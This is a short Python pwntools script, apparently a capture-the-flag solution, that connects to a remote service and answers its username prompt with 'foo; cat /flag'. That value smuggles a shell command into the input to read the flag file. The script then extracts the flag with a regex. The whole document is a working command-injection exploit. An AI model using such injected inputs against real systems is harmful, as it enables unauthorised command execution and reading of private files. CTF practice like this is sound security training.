#!/usr/bin/env python3

import pwn
import re
import sys

#pwn.context.log_level = 'debug'
conn = pwn.remote(sys.argv[1], sys.argv[2])
conn.recvuntil(b"username: ")
conn.sendline(b"foo; cat /flag")
complete_output = ""
while True:
	try:
		output = str(conn.recv())
	except:
		break
	if not output:
		break
	complete_output += output
	
m = re.search(r"ictf\{[^}]+\}", complete_output)
print(m.group(0))
